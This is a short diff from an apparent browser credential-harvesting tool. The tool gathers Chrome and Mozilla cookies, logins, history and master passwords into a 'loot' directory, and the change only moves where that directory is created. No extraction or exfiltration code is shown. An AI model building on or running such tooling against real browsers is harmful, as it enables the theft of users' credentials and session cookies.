@@ -57,8 +57,6 @@ def delete_if_empty(filename: str) -> bool:
 
 
 def get_data(browser_dict: dict, cookies=None, logins=False, history=False, masterpass=None):
-	loot_dir = f"{script_path}/loot/{user}"
-	os.makedirs(loot_dir, exist_ok=True)
 	os.chdir(loot_dir)
 	chrome_profiles = browser_dict['chrome']
 	mozilla_profiles = browser_dict['mozilla']
@@ -156,6 +154,9 @@ if __name__ == '__main__':
 	user = info.username
 	if options.username:
 		user = options.username
+
+	loot_dir = f"{script_path}/loot/{user}"
+	os.makedirs(loot_dir, exist_ok=True)
 
 	profile_dirs = None
 	if options.profile_dir:
